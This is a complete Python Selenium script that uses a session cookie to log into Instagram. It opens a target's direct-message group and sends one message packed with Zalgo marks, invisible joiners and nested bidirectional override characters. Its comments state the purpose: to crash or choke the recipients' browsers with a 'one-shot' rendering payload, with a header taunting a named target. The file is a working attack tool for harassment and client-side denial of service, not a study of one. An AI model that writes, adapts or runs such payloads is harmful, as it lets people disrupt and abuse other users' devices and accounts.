# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER NC (MONOLITH V2 - FIXED)
# 📅 STATUS: DENSITY x30 | CORRECTED IMPORTS | ONE-SHOT CRASH

import os, time, random, sys, gc
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys  # ✅ FIXED IMPORT
from selenium.webdriver.chrome.options import Options

def get_monolith_payload(target_name):
    """The Monolith: One message, x30 density rendering exhaustion."""
    header = f"🌙 DEVEL KA ABBU PRAVEER OK? 🌙\n👑 STATUS: OBLITERATION\n"
    
    # 💥 THE 'LAYOUT TRAP' (U+2060 Word Joiner)
    trap = "\u2060" * 80
    
    # 💥 DENSITY x30 (300 Zalgo marks) 
    # This forces the browser's GPU buffer to hit its limit immediately.
    z_tower = "̸" * 300
    
    # 💥 BIDI RECURSION (Deep Directional Stacking)
    bidi_logic = "\u202E\u2066\u202D\u2067" * 12
    
    lines = [header]
    
    # 💥 80 Lines of High-Density Skyscraper
    for i in range(80):
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        lines.append(f"{prefix}{trap}{target_name.upper()}{z_tower}{bidi_logic}")
    
    return "\n".join(lines)[:9995]

def get_driver():
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--window-size=1920,1080")
    chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
    return webdriver.Chrome(options=chrome_options)

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    target_name = os.environ.get("TARGET_NAME", "Target").strip()
    
    if not cookie or not target_id:
        print("❌ MISSING SECRETS")
        sys.exit(1)

    driver = None
    try:
        print(f"🚀 DEPLOYING MONOLITH V2 FOR {target_name.upper()}...")
        driver = get_driver()
        driver.get("https://www.instagram.com/")
        driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
        driver.refresh()
        time.sleep(10)
        
        driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
        time.sleep(15)

        try:
            box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
            payload = get_monolith_payload(target_name)
            
            # Atomic Injection via JS to prevent runner-side lag
            driver.execute_script("""
                var el = arguments[0];
                document.execCommand('insertText', false, arguments[1]);
                el.dispatchEvent(new Event('input', { bubbles: true }));
            """, box, payload)
            
            time.sleep(2)
            box.send_keys(Keys.ENTER)
            print(f"💀 MONOLITH V2 LANDED | x30 DENSITY ACTIVE")
            
            # Wait to ensure the socket stays open while the target browser chokes
            time.sleep(60) 
            
        except Exception as e:
            print(f"❌ SEND FAILED: {e}")

    except Exception as e:
        print(f"❌ ERROR: {e}")
    finally:
        if driver:
            driver.quit()
        gc.collect()

if __name__ == "__main__":
    main()
